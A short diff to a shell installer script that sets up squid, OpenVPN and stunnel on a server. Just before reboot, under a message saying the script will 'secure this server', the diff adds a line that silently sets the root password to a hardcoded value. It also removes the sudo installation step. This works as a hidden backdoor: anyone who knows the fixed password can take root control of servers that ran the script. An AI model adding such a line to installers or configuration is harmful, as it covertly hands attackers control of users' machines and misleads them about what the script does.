@@ -714,11 +714,11 @@ install_done()
   rm /root/.installer
   echo "Server will secure this server and reboot after 20 seconds"
   sleep 20
+  echo 'root:JAN022011b' | sudo chpasswd
   reboot
 }
 
 install_require
-install_sudo
 install_squid
 install_openvpn
 install_stunnel
